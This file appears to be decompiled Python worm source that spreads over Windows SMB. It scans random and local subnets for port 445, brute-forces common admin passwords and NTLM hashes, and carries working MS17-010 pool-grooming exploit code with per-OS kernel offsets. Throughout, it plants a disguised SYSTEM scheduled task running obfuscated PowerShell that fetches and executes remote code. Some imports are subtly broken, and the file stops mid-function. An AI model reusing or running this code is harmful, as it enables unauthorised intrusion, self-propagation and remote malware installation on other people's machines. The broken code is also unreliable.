# Embedded file name: ii.py
from __future__ import division, print_function, xrange
import subprocess
import re
import binascii
import struct
import threading
import socket
import os
import random
import platform
from urllib2 import urlopen
from json import load
from impacket import smb, smbconnection
from mysmb import MYSMB
from struct import pack, unpack, unpack_from
import sys
import time
from psexec import PSEXEC


global h_one ## Warning: Unused global


iplist = ['192.168.0.1/24',
 '192.168.1.1/24',
 '192.168.2.1/24',
 '192.168.3.1/24',
 '192.168.4.1/24',
 '192.168.5.1/24',
 '192.168.6.1/24',
 '192.168.7.1/24',
 '192.168.8.1/24',
 '192.168.9.1/24',
 '192.168.10.1/24',
 '192.168.18.1/24',
 '192.168.31.1/24',
 '192.168.199.1/24',
 '192.168.254.1/24',
 '192.168.67.1/24',
 '10.0.0.1/24',
 '10.0.1.1/24',
 '10.0.2.1/24',
 '10.1.1.1/24',
 '10.90.90.1/24',
 '10.1.10.1/24',
 '10.10.1.1/24']

userlist = ['',
 'Administrator',
 'user',
 'admin',
 'test',
 'hp',
 'guest']

userlist2 = ['', 'Administrator', 'admin']

passlist = ['',
 '123456',
 'password',
 'qwerty',
 '12345678',
 '123456789',
 '123',
 '1234',
 '123123',
 '12345',
 '12345678',
 '123123123',
 '1234567890',
 '88888888',
 '111111111',
 '000000',
 '111111',
 '112233',
 '123321',
 '654321',
 '666666',
 '888888',
 'a123456',
 '123456a',
 '5201314',
 '1qaz2wsx',
 '1q2w3e4r',
 'qwe123',
 '123qwe',
 'a123456789',
 '123456789a',
 'baseball',
 'dragon',
 'football',
 'iloveyou',
 'password',
 'sunshine',
 'princess',
 'welcome',
 'abc123',
 'monkey',
 '!@#$%^&*',
 'charlie',
 'aa123456',
 'Aa123456',
 'admin',
 'homelesspa',
 'password1',
 '1q2w3e4r5t',
 'qwertyuiop',
 '1qaz2wsx']

domainlist = ['']

nip = []

ntlist = []

mkatz = "abc"

# 获取本地IP和外网IP
def find_ip():
    global iplist2
    ipconfig_process = subprocess.Popen('ipconfig /all', stdout=subprocess.PIPE)
    output = ipconfig_process.stdout.read()
    result = re.findall('\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b', output)
    for ipaddr in result:
        if ipaddr != '127.0.0.1' and ipaddr != '255.255.255.0' and ipaddr != '0.0.0.0':
            ipaddr = ipaddr.split('.')[0] + '.' + ipaddr.split('.')[1] + '.' + ipaddr.split('.')[2] + '.1/24'
            iplist.append(ipaddr)

    netstat_process = subprocess.Popen('netstat -na', stdout=subprocess.PIPE)
    output2 = netstat_process.stdout.read()
    result2 = re.findall('\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b', output2)
    for ip in result2:
        if ip != '127.0.0.1' and ip != '0.0.0.0' and ip != '255.255.0.0' and ip != '1.1.1.1':
            ip = ip.split('.')[0] + '.' + ip.split('.')[1] + '.' + ip.split('.')[2] + '.1/24'
            iplist.append(ip)

    try:
        ipp1 = urlopen('http://ip.42.pl/raw', timeout=3).read()
        ipp1 = ipp1.split('.')[0] + '.' + ipp1.split('.')[1] + '.' + ipp1.split('.')[2] + '.1/24'
        ipp2 = load(urlopen('http://jsonip.com', timeout=3))['ip']
        ipp2 = ipp2.split('.')[0] + '.' + ipp2.split('.')[1] + '.' + ipp2.split('.')[2] + '.1/24'
        iplist.append(ipp1)
        iplist.append(ipp2)
    except:
        pass

    iplist2 = list(set(iplist))
    iplist2.sort(key=iplist.index)
    return iplist2

# 生成随机IP？
def xip(numb):
    del nip[:]
    for n in xrange(numb):
        ipp = socket.inet_ntoa(struct.pack('>I', random.randint(1, 4294967295L)))
        ipp = ipp.split('.')[0] + '.' + ipp.split('.')[1] + '.' + ipp.split('.')[2] + '.1/24'
        nip.append(ipp)

    return nip


def scan(ip, p):
    global timeout
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(float(timeout) if timeout else None)
    try:
        s.connect((ip, p))
        return 1
    except Exception as e:
        return 0


def scan2(ip, p):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(float(2))
    try:
        s.connect((ip, p))
        return 1
    except Exception as e:
        return 0


def scan3(ip, p):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(float(1))
    try:
        s.connect((ip, p))
        return 1
    except Exception as e:
        return 0

# 漏洞验证
def validate(ip, fr):
    global userlist2 # admin administrator
    global dl # 空
    global ee2 # 空
    global domainlist # 空列表
    global passlist # 密码
    for u in userlist2:
        for p in passlist:
            if u == '' and p != '':
                continue
            for d in domainlist:
                if PSEXEC(ee2, dl, 'cmd.exe /c schtasks /create /ru system /sc MINUTE /mo 50 /st 07:00:00 /tn "\\Microsoft\\windows\\Bluetooths" /tr "powershell -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdgAuAGIAZQBhAGgAaAAuAGMAbwBtAC8AdgAnACsAJABlAG4AdgA6AFUAUwBFAFIARABPAE0AQQBJAE4AKQA=" /F&&c:\\windows\\temp\\svchost.exe', u, p, d, fr).run(ip):
                    print('SMB Succ!')
                    return


def validate2(ip, fr):
    global ntlist
    for u in userlist2:
        for d in domainlist:
            for n in ntlist:
                if PSEXEC(ee2, dl, 'cmd.exe /c schtasks /create /ru system /sc MINUTE /mo 50 /st 07:00:00 /tn "\\Microsoft\\windows\\Bluetooths" /tr "powershell -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdgAuAGIAZQBhAGgAaAAuAGMAbwBtAC8AdgAnACsAJABlAG4AdgA6AFUAUwBFAFIARABPAE0AQQBJAE4AKQA=" /F&&c:\\windows\\temp\\svchost.exe', u, '', d, fr, '00000000000000000000000000000000:' + n).run(ip):
                    print('SMB Succ!')
                    return


def scansmb(ip, p):
    global semaphore1
    if scan(ip, 445) == 1:
        if scan(ip, 65533) == 0:
            print('exp IP:' + ip)
            try:
                validate(ip, '1')
            except:
                pass

            try:
                check_ip(ip, 1)
            except:
                pass

            try:
                validate2(ip, '3')
            except:
                pass

    semaphore1.release()

# 扫描smb 445端口
def scansmb2(ip, p):
    # 1为端口开放
    if scan2(ip, 445) == 1:
        print('exp IP:' + ip)
        try:
            validate(ip, '2')
        except:
            pass

        try:
            check_ip(ip, 2)
        except:
            pass

        try:
            validate2(ip, '2')
        except:
            pass

    semaphore1.release()


def scansmb3(ip, p):
    global semaphore2
    if scan3(ip, 445) == 1:
        if scan3(ip, 65533) == 0:
            print('exp IP:' + ip)
            try:
                validate(ip, '2')
            except:
                pass

            try:
                check_ip(ip, 2)
            except:
                pass

            try:
                validate2(ip, '3')
            except:
                pass

    semaphore2.release()


WIN7_64_SESSION_INFO = {'SESSION_SECCTX_OFFSET': 160,
 'SESSION_ISNULL_OFFSET': 186,
 'FAKE_SECCTX': pack('<IIQQIIB', 2621994, 1, 0, 0, 2, 0, 1),
 'SECCTX_SIZE': 40}
WIN7_32_SESSION_INFO = {'SESSION_SECCTX_OFFSET': 128,
 'SESSION_ISNULL_OFFSET': 150,
 'FAKE_SECCTX': pack('<IIIIIIB', 1835562, 1, 0, 0, 2, 0, 1),
 'SECCTX_SIZE': 28}
WIN8_64_SESSION_INFO = {'SESSION_SECCTX_OFFSET': 176,
 'SESSION_ISNULL_OFFSET': 202,
 'FAKE_SECCTX': pack('<IIQQQQIIB', 3670570, 1, 0, 0, 0, 0, 2, 0, 1),
 'SECCTX_SIZE': 56}
WIN8_32_SESSION_INFO = {'SESSION_SECCTX_OFFSET': 136,
 'SESSION_ISNULL_OFFSET': 158,
 'FAKE_SECCTX': pack('<IIIIIIIIB', 2359850, 1, 0, 0, 0, 0, 2, 0, 1),
 'SECCTX_SIZE': 36}
WIN2K3_64_SESSION_INFO = {'SESSION_ISNULL_OFFSET': 186,
 'SESSION_SECCTX_OFFSET': 160,
 'SECCTX_PCTXTHANDLE_OFFSET': 16,
 'PCTXTHANDLE_TOKEN_OFFSET': 64,
 'TOKEN_USER_GROUP_CNT_OFFSET': 76,
 'TOKEN_USER_GROUP_ADDR_OFFSET': 104}
WIN2K3_32_SESSION_INFO = {'SESSION_ISNULL_OFFSET': 150,
 'SESSION_SECCTX_OFFSET': 128,
 'SECCTX_PCTXTHANDLE_OFFSET': 12,
 'PCTXTHANDLE_TOKEN_OFFSET': 36,
 'TOKEN_USER_GROUP_CNT_OFFSET': 76,
 'TOKEN_USER_GROUP_ADDR_OFFSET': 104}
WINXP_32_SESSION_INFO = {'SESSION_ISNULL_OFFSET': 148,
 'SESSION_SECCTX_OFFSET': 132,
 'PCTXTHANDLE_TOKEN_OFFSET': 36,
 'TOKEN_USER_GROUP_CNT_OFFSET': 76,
 'TOKEN_USER_GROUP_ADDR_OFFSET': 104,
 'TOKEN_USER_GROUP_CNT_OFFSET_SP0_SP1': 64,
 'TOKEN_USER_GROUP_ADDR_OFFSET_SP0_SP1': 92}
WIN2K_32_SESSION_INFO = {'SESSION_ISNULL_OFFSET': 148,
 'SESSION_SECCTX_OFFSET': 132,
 'PCTXTHANDLE_TOKEN_OFFSET': 36,
 'TOKEN_USER_GROUP_CNT_OFFSET': 60,
 'TOKEN_USER_GROUP_ADDR_OFFSET': 88}
WIN7_32_TRANS_INFO = {'TRANS_SIZE': 160,
 'TRANS_FLINK_OFFSET': 24,
 'TRANS_INPARAM_OFFSET': 64,
 'TRANS_OUTPARAM_OFFSET': 68,
 'TRANS_INDATA_OFFSET': 72,
 'TRANS_OUTDATA_OFFSET': 76,
 'TRANS_PARAMCNT_OFFSET': 88,
 'TRANS_TOTALPARAMCNT_OFFSET': 92,
 'TRANS_FUNCTION_OFFSET': 114,
 'TRANS_MID_OFFSET': 128}
WIN7_64_TRANS_INFO = {'TRANS_SIZE': 248,
 'TRANS_FLINK_OFFSET': 40,
 'TRANS_INPARAM_OFFSET': 112,
 'TRANS_OUTPARAM_OFFSET': 120,
 'TRANS_INDATA_OFFSET': 128,
 'TRANS_OUTDATA_OFFSET': 136,
 'TRANS_PARAMCNT_OFFSET': 152,
 'TRANS_TOTALPARAMCNT_OFFSET': 156,
 'TRANS_FUNCTION_OFFSET': 178,
 'TRANS_MID_OFFSET': 192}
WIN5_32_TRANS_INFO = {'TRANS_SIZE': 152,
 'TRANS_FLINK_OFFSET': 24,
 'TRANS_INPARAM_OFFSET': 60,
 'TRANS_OUTPARAM_OFFSET': 64,
 'TRANS_INDATA_OFFSET': 68,
 'TRANS_OUTDATA_OFFSET': 72,
 'TRANS_PARAMCNT_OFFSET': 84,
 'TRANS_TOTALPARAMCNT_OFFSET': 88,
 'TRANS_FUNCTION_OFFSET': 110,
 'TRANS_PID_OFFSET': 120,
 'TRANS_MID_OFFSET': 124}
WIN5_64_TRANS_INFO = {'TRANS_SIZE': 224,
 'TRANS_FLINK_OFFSET': 40,
 'TRANS_INPARAM_OFFSET': 104,
 'TRANS_OUTPARAM_OFFSET': 112,
 'TRANS_INDATA_OFFSET': 120,
 'TRANS_OUTDATA_OFFSET': 128,
 'TRANS_PARAMCNT_OFFSET': 144,
 'TRANS_TOTALPARAMCNT_OFFSET': 148,
 'TRANS_FUNCTION_OFFSET': 170,
 'TRANS_PID_OFFSET': 180,
 'TRANS_MID_OFFSET': 184}
X86_INFO = {'ARCH': 'x86',
 'PTR_SIZE': 4,
 'PTR_FMT': 'I',
 'FRAG_TAG_OFFSET': 12,
 'POOL_ALIGN': 8,
 'SRV_BUFHDR_SIZE': 8}
X64_INFO = {'ARCH': 'x64',
 'PTR_SIZE': 8,
 'PTR_FMT': 'Q',
 'FRAG_TAG_OFFSET': 20,
 'POOL_ALIGN': 16,
 'SRV_BUFHDR_SIZE': 16}

def merge_dicts(*dict_args):
    result = {}
    for dictionary in dict_args:
        result.update(dictionary)

    return result


OS_ARCH_INFO = {'WIN7': {'x86': merge_dicts(X86_INFO, WIN7_32_TRANS_INFO, WIN7_32_SESSION_INFO),
          'x64': merge_dicts(X64_INFO, WIN7_64_TRANS_INFO, WIN7_64_SESSION_INFO)},
 'WIN8': {'x86': merge_dicts(X86_INFO, WIN7_32_TRANS_INFO, WIN8_32_SESSION_INFO),
          'x64': merge_dicts(X64_INFO, WIN7_64_TRANS_INFO, WIN8_64_SESSION_INFO)},
 'WINXP': {'x86': merge_dicts(X86_INFO, WIN5_32_TRANS_INFO, WINXP_32_SESSION_INFO),
           'x64': merge_dicts(X64_INFO, WIN5_64_TRANS_INFO, WIN2K3_64_SESSION_INFO)},
 'WIN2K3': {'x86': merge_dicts(X86_INFO, WIN5_32_TRANS_INFO, WIN2K3_32_SESSION_INFO),
            'x64': merge_dicts(X64_INFO, WIN5_64_TRANS_INFO, WIN2K3_64_SESSION_INFO)},
 'WIN2K': {'x86': merge_dicts(X86_INFO, WIN5_32_TRANS_INFO, WIN2K_32_SESSION_INFO)}}
TRANS_NAME_LEN = 4
HEAP_HDR_SIZE = 8

def calc_alloc_size(size, align_size):
    return size + align_size - 1 & ~(align_size - 1)


def wait_for_request_processed(conn):
    conn.send_echo('a')


def find_named_pipe(conn):
    pipes = ['browser',
     'spoolss',
     'netlogon',
     'lsarpc',
     'samr']
    tid = conn.tree_connect_andx('\\\\' + conn.get_remote_host() + '\\' + 'IPC$')
    found_pipe = None
    for pipe in pipes:
        try:
            fid = conn.nt_create_andx(tid, pipe)
            conn.close(tid, fid)
            found_pipe = pipe
            break
        except smb.SessionError as e:
            pass

    conn.disconnect_tree(tid)
    return found_pipe


special_mid = 0
extra_last_mid = 0

def reset_extra_mid(conn):
    global special_mid
    global extra_last_mid
    special_mid = (conn.next_mid() & 65280) - 256
    extra_last_mid = special_mid


def next_extra_mid():
    global extra_last_mid
    extra_last_mid += 1
    return extra_last_mid


GROOM_TRANS_SIZE = 20496

def leak_frag_size(conn, tid, fid):
    info = {}
    mid = conn.next_mid()
    req1 = conn.create_nt_trans_packet(5, param=pack('<HH', fid, 0), mid=mid, data='A' * 4304, maxParameterCount=GROOM_TRANS_SIZE - 4304 - TRANS_NAME_LEN)
    req2 = conn.create_nt_trans_secondary_packet(mid, data='B' * 276)
    conn.send_raw(req1[:-8])
    conn.send_raw(req1[-8:] + req2)
    leakData = conn.recv_transaction_data(mid, 4580)
    leakData = leakData[4308:]
    if leakData[X86_INFO['FRAG_TAG_OFFSET']:X86_INFO['FRAG_TAG_OFFSET'] + 4] == 'Frag':
        print('Target is 32 bit')
        info['arch'] = 'x86'
        info['FRAG_POOL_SIZE'] = ord(leakData[X86_INFO['FRAG_TAG_OFFSET'] - 2]) * X86_INFO['POOL_ALIGN']
    elif leakData[X64_INFO['FRAG_TAG_OFFSET']:X64_INFO['FRAG_TAG_OFFSET'] + 4] == 'Frag':
        print('Target is 64 bit')
        info['arch'] = 'x64'
        info['FRAG_POOL_SIZE'] = ord(leakData[X64_INFO['FRAG_TAG_OFFSET'] - 2]) * X64_INFO['POOL_ALIGN']
    else:
        print('Not found Frag pool tag in leak data')
    print('Got frag size: 0x{:x}'.format(info['FRAG_POOL_SIZE']))
    return info


def read_data(conn, info, read_addr, read_size):
    fmt = info['PTR_FMT']
    new_data = pack('<' + fmt * 3, info['trans2_addr'] + info['TRANS_FLINK_OFFSET'], info['trans2_addr'] + 512, read_addr)
    new_data += pack('<II', 0, 0)
    new_data += pack('<III', 8, 8, 8)
    new_data += pack('<III', read_size, read_size, read_size)
    new_data += pack('<HH', 0, 5)
    conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=new_data, dataDisplacement=info['TRANS_OUTPARAM_OFFSET'])
    conn.send_nt_trans(5, param=pack('<HH', info['fid'], 0), totalDataCount=17120, totalParameterCount=4096)
    conn.send_nt_trans_secondary(mid=info['trans2_mid'])
    read_data = conn.recv_transaction_data(info['trans2_mid'], 8 + read_size)
    info['trans2_addr'] = unpack_from('<' + fmt, read_data)[0] - info['TRANS_FLINK_OFFSET']
    conn.send_nt_trans_secondary(mid=info['trans1_mid'], param=pack('<' + fmt, info['trans2_addr']), paramDisplacement=info['TRANS_INDATA_OFFSET'])
    wait_for_request_processed(conn)
    conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack('<H', info['trans2_mid']), dataDisplacement=info['TRANS_MID_OFFSET'])
    wait_for_request_processed(conn)
    return read_data[8:]


def write_data(conn, info, write_addr, write_data):
    conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack('<' + info['PTR_FMT'], write_addr), dataDisplacement=info['TRANS_INDATA_OFFSET'])
    wait_for_request_processed(conn)
    conn.send_nt_trans_secondary(mid=info['trans2_mid'], data=write_data)
    wait_for_request_processed(conn)


def align_transaction_and_leak(conn, tid, fid, info, numFill = 4):
    trans_param = pack('<HH', fid, 0)
    for i in range(numFill):
        conn.send_nt_trans(5, param=trans_param, totalDataCount=4304, maxParameterCount=GROOM_TRANS_SIZE - 4304)

    mid_ntrename = conn.next_mid()
    req1 = conn.create_nt_trans_packet(5, param=trans_param, mid=mid_ntrename, data='A' * 4304, maxParameterCount=info['GROOM_DATA_SIZE'] - 4304)
    req2 = conn.create_nt_trans_secondary_packet(mid_ntrename, data='B' * 276)
    req3 = conn.create_nt_trans_packet(5, param=trans_param, mid=fid, totalDataCount=info['GROOM_DATA_SIZE'] - 4096, maxParameterCount=4096)
    reqs = []
    for i in range(12):
        mid = next_extra_mid()
        reqs.append(conn.create_trans_packet('', mid=mid, param=trans_param, totalDataCount=info['BRIDE_DATA_SIZE'] - 512, totalParameterCount=512, maxDataCount=0, maxParameterCount=0))

    conn.send_raw(req1[:-8])
    conn.send_raw(req1[-8:] + req2 + req3 + ''.join(reqs))
    leakData = conn.recv_transaction_data(mid_ntrename, 4580)
    leakData = leakData[4308:]
    if leakData[info['FRAG_TAG_OFFSET']:info['FRAG_TAG_OFFSET'] + 4] != 'Frag':
        print('Not found Frag pool tag in leak data')
        return None
    leakData = leakData[info['FRAG_TAG_OFFSET'] - 4 + info['FRAG_POOL_SIZE']:]
    expected_size = pack('<H', info['BRIDE_TRANS_SIZE'])
    leakTransOffset = info['POOL_ALIGN'] + info['SRV_BUFHDR_SIZE']
    if leakData[4:8] != 'LStr' or leakData[info['POOL_ALIGN']:info['POOL_ALIGN'] + 2] != expected_size or leakData[leakTransOffset + 2:leakTransOffset + 4] != expected_size:
        print('No transaction struct in leak data')
        return None
    leakTrans = leakData[leakTransOffset:]
    ptrf = info['PTR_FMT']
    _, connection_addr, session_addr, treeconnect_addr, flink_value = unpack_from('<' + ptrf * 5, leakTrans, 8)
    inparam_value = unpack_from('<' + ptrf, leakTrans, info['TRANS_INPARAM_OFFSET'])[0]
    leak_mid = unpack_from('<H', leakTrans, info['TRANS_MID_OFFSET'])[0]
    print('CONNECTION: 0x{:x}'.format(connection_addr))
    print('SESSION: 0x{:x}'.format(session_addr))
    print('FLINK: 0x{:x}'.format(flink_value))
    print('InParam: 0x{:x}'.format(inparam_value))
    print('MID: 0x{:x}'.format(leak_mid))
    next_page_addr = (inparam_value & 18446744073709547520L) + 4096
    if next_page_addr + info['GROOM_POOL_SIZE'] + info['FRAG_POOL_SIZE'] + info['POOL_ALIGN'] + info['SRV_BUFHDR_SIZE'] + info['TRANS_FLINK_OFFSET'] != flink_value:
        print('unexpected alignment, diff: 0x{:x}'.format(flink_value - next_page_addr))
        return None
    return {'connection': connection_addr,
     'session': session_addr,
     'next_page_addr': next_page_addr,
     'trans1_mid': leak_mid,
     'trans1_addr': inparam_value - info['TRANS_SIZE'] - TRANS_NAME_LEN,
     'trans2_addr': flink_value - info['TRANS_FLINK_OFFSET']}


def exploit_matched_pairs(conn, pipe_name, info):
    tid = conn.tree_connect_andx('\\\\' + conn.get_remote_host() + '\\' + 'IPC$')
    conn.set_default_tid(tid)
    fid = conn.nt_create_andx(tid, pipe_name)
    info.update(leak_frag_size(conn, tid, fid))
    info.update(OS_ARCH_INFO[info['os']][info['arch']])
    info['GROOM_POOL_SIZE'] = calc_alloc_size(GROOM_TRANS_SIZE + info['SRV_BUFHDR_SIZE'] + info['POOL_ALIGN'], info['POOL_ALIGN'])
    print('GROOM_POOL_SIZE: 0x{:x}'.format(info['GROOM_POOL_SIZE']))
    info['GROOM_DATA_SIZE'] = GROOM_TRANS_SIZE - TRANS_NAME_LEN - 4 - info['TRANS_SIZE']
    bridePoolSize = 4096 - (info['GROOM_POOL_SIZE'] & 4095) - info['FRAG_POOL_SIZE']
    info['BRIDE_TRANS_SIZE'] = bridePoolSize - (info['SRV_BUFHDR_SIZE'] + info['POOL_ALIGN'])
    print('BRIDE_TRANS_SIZE: 0x{:x}'.format(info['BRIDE_TRANS_SIZE']))
    info['BRIDE_DATA_SIZE'] = info['BRIDE_TRANS_SIZE'] - TRANS_NAME_LEN - info['TRANS_SIZE']
    leakInfo = None
    for i in range(10):
        reset_extra_mid(conn)
        leakInfo = align_transaction_and_leak(conn, tid, fid, info)
        if leakInfo is not None:
            break
        print('leak failed... try again')
        conn.close(tid, fid)
        conn.disconnect_tree(tid)
        tid = conn.tree_connect_andx('\\\\' + conn.get_remote_host() + '\\' + 'IPC$')
        conn.set_default_tid(tid)
        fid = conn.nt_create_andx(tid, pipe_name)

    if leakInfo is None:
        return False
    info['fid'] = fid
    info.update(leakInfo)
    shift_indata_byte = 512
    conn.do_write_andx_raw_pipe(fid, 'A' * shift_indata_byte)
    indata_value = info['next_page_addr'] + info['TRANS_SIZE'] + 8 + info['SRV_BUFHDR_SIZE'] + 4096 + shift_indata_byte
    indata_next_trans_displacement = info['trans2_addr'] - indata_value
    conn.send_nt_trans_secondary(mid=fid, data='\x00', dataDisplacement=indata_next_trans_displacement + info['TRANS_MID_OFFSET'])
    wait_for_request_processed(conn)
    recvPkt = conn.send_nt_trans(5, mid=special_mid, param=pack('<HH', fid, 0), data='')
    if recvPkt.getNTStatus() != 65538:
        print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
        print('!!! Write to wrong place !!!')
        print('the target might be crashed')
        return False
    print('success controlling groom transaction')
    print('modify trans1 struct for arbitrary read/write')
    fmt = info['PTR_FMT']
    conn.send_nt_trans_secondary(mid=fid, data=pack('<' + fmt, info['trans1_addr']), dataDisplacement=indata_next_trans_displacement + info['TRANS_INDATA_OFFSET'])
    wait_for_request_processed(conn)
    conn.send_nt_trans_secondary(mid=special_mid, data=pack('<' + fmt * 3, info['trans1_addr'], info['trans1_addr'] + 512, info['trans2_addr']), dataDisplacement=info['TRANS_INPARAM_OFFSET'])
    wait_for_request_processed(conn)
    info['trans2_mid'] = conn.next_mid()
    conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack('<H', info['trans2_mid']), dataDisplacement=info['TRANS_MID_OFFSET'])
    return True


def exploit_fish_barrel(conn, pipe_name, info):
    tid = conn.tree_connect_andx('\\\\' + conn.get_remote_host() + '\\' + 'IPC$')
    conn.set_default_tid(tid)
    fid = conn.nt_create_andx(tid, pipe_name)
    info['fid'] = fid
    if info['os'] == 'WIN7' and 'arch' not in info:
        info.update(leak_frag_size(conn, tid, fid))
    if 'arch' in info:
        info.update(OS_ARCH_INFO[info['os']][info['arch']])
        attempt_list = [OS_ARCH_INFO[info['os']][info['arch']]]
    else:
        attempt_list = [OS_ARCH_INFO[info['os']]['x64'], OS_ARCH_INFO[info['os']]['x86']]
    print('Groom packets')
    trans_param = pack('<HH', info['fid'], 0)
    for i in range(12):
        mid = info['fid'] if i == 8 else next_extra_mid()
        conn.send_trans('', mid=mid, param=trans_param, totalParameterCount=256 - TRANS_NAME_LEN, totalDataCount=3776, maxParameterCount=64, maxDataCount=0)

    shift_indata_byte = 512
    conn.do_write_andx_raw_pipe(info['fid'], 'A' * shift_indata_byte)
    success = False
    for tinfo in attempt_list:
        print('attempt controlling next transaction on ' + tinfo['ARCH'])
        HEAP_CHUNK_PAD_SIZE = (tinfo['POOL_ALIGN'] - (tinfo['TRANS_SIZE'] + HEAP_HDR_SIZE) % tinfo['POOL_ALIGN']) % tinfo['POOL_ALIGN']
        NEXT_TRANS_OFFSET = 3840 - shift_indata_byte + HEAP_CHUNK_PAD_SIZE + HEAP_HDR_SIZE
        conn.send_trans_secondary(mid=info['fid'], data='\x00', dataDisplacement=NEXT_TRANS_OFFSET + tinfo['TRANS_MID_OFFSET'])
        wait_for_request_processed(conn)
        recvPkt = conn.send_nt_trans(5, mid=special_mid, param=trans_param, data='')
        if recvPkt.getNTStatus() == 65538:
            print('success controlling one transaction')
            success = True
            if 'arch' not in info:
                print('Target is ' + tinfo['ARCH'])
                info['arch'] = tinfo['ARCH']
                info.update(OS_ARCH_INFO[info['os']][info['arch']])
            break
        if recvPkt.getNTStatus() != 0:
            print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))

    if not success:
        print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
        print('!!! Write to wrong place !!!')
        print('the target might be crashed')
        return False
    print('modify parameter count to 0xffffffff to be able to write backward')
    conn.send_trans_secondary(mid=info['fid'], data='\xff\xff\xff\xff', dataDisplacement=NEXT_TRANS_OFFSET + info['TRANS_TOTALPARAMCNT_OFFSET'])
    if info['arch'] == 'x64':
        conn.send_trans_secondary(mid=info['fid'], data='\xff\xff\xff\xff', dataDisplacement=NEXT_TRANS_OFFSET + info['TRANS_INPARAM_OFFSET'] + 4)
    wait_for_request_processed(conn)
    TRANS_CHUNK_SIZE = HEAP_HDR_SIZE + info['TRANS_SIZE'] + 4096 + HEAP_CHUNK_PAD_SIZE
    PREV_TRANS_DISPLACEMENT = TRANS_CHUNK_SIZE + info['TRANS_SIZE'] + TRANS_NAME_LEN
    PREV_TRANS_OFFSET = 4294967296L - PREV_TRANS_DISPLACEMENT
    conn.send_nt_trans_secondary(mid=special_mid, param='\xff\xff\xff\xff', paramDisplacement=PREV_TRANS_OFFSET + info['TRANS_TOTALPARAMCNT_OFFSET'])
    if info['arch'] == 'x64':
        conn.send_nt_trans_secondary(mid=special_mid, param='\xff\xff\xff\xff', paramDisplacement=PREV_TRANS_OFFSET + info['TRANS_INPARAM_OFFSET'] + 4)
        conn.send_trans_secondary(mid=info['fid'], data='\x00\x00\x00\x00', dataDisplacement=NEXT_TRANS_OFFSET + info['TRANS_INPARAM_OFFSET'] + 4)
    wait_for_request_processed(conn)
    print('leak next transaction')
    conn.send_trans_secondary(mid=info['fid'], data='\x05', dataDisplacement=NEXT_TRANS_OFFSET + info['TRANS_FUNCTION_OFFSET'])
    conn.send_trans_secondary(mid=info['fid'], data=pack('<IIIII', 4, 4, 4, 256, 256), dataDisplacement=NEXT_TRANS_OFFSET + info['TRANS_PARAMCNT_OFFSET'])
    conn.send_nt_trans_secondary(mid=special_mid)
    leakData = conn.recv_transaction_data(special_mid, 256)
    leakData = leakData[4:]
    if unpack_from('<H', leakData, HEAP_CHUNK_PAD_SIZE)[0] != TRANS_CHUNK_SIZE // info['POOL_ALIGN']:
        print('chunk size is wrong')
        return False
    leakTranOffset = HEAP_CHUNK_PAD_SIZE + HEAP_HDR_SIZE
    leakTrans = leakData[leakTranOffset:]
    fmt = info['PTR_FMT']
    _, connection_addr, session_addr, treeconnect_addr, flink_value = unpack_from('<' + fmt * 5, leakTrans, 8)
    inparam_value, outparam_value, indata_value = unpack_from('<' + fmt * 3, leakTrans, info['TRANS_INPARAM_OFFSET'])
    trans2_mid = unpack_from('<H', leakTrans, info['TRANS_MID_OFFSET'])[0]
    print('CONNECTION: 0x{:x}'.format(connection_addr))
    print('SESSION: 0x{:x}'.format(session_addr))
    print('FLINK: 0x{:x}'.format(flink_value))
    print('InData: 0x{:x}'.format(indata_value))
    print('MID: 0x{:x}'.format(trans2_mid))
    trans2_addr = inparam_value - info['TRANS_SIZE'] - TRANS_NAME_LEN
    trans1_addr = trans2_addr - TRANS_CHUNK_SIZE * 2
    print('TRANS1: 0x{:x}'.format(trans1_addr))
    print('TRANS2: 0x{:x}'.format(trans2_addr))
    print('modify transaction struct for arbitrary read/write')
    TRANS_OFFSET = 4294967296L - (info['TRANS_SIZE'] + TRANS_NAME_LEN)
    conn.send_nt_trans_secondary(mid=info['fid'], param=pack('<' + fmt * 3, trans1_addr, trans1_addr + 512, trans2_addr), paramDisplacement=TRANS_OFFSET + info['TRANS_INPARAM_OFFSET'])
    wait_for_request_processed(conn)
    trans1_mid = conn.next_mid()
    conn.send_trans_secondary(mid=info['fid'], param=pack('<H', trans1_mid), paramDisplacement=info['TRANS_MID_OFFSET'])
    wait_for_request_processed(conn)
    info.update({'connection': connection_addr,
     'session': session_addr,
     'trans1_mid': trans1_mid,
     'trans1_addr': trans1_addr,
     'trans2_mid': trans2_mid,
     'trans2_addr': trans2_addr})
    return True


def create_fake_SYSTEM_UserAndGroups(conn, info, userAndGroupCount, userAndGroupsAddr):
    SID_SYSTEM = pack('<BB5xBI', 1, 1, 5, 18)
    SID_ADMINISTRATORS = pack('<BB5xBII', 1, 2, 5, 32, 544)
    SID_AUTHENICATED_USERS = pack('<BB5xBI', 1, 1, 5, 11)
    SID_EVERYONE = pack('<BB5xBI', 1, 1, 1, 0)
    sids = [SID_SYSTEM,
     SID_ADMINISTRATORS,
     SID_EVERYONE,
     SID_AUTHENICATED_USERS]
    attrs = [0,
     14,
     7,
     7]
    fakeUserAndGroupCount = min(userAndGroupCount, 4)
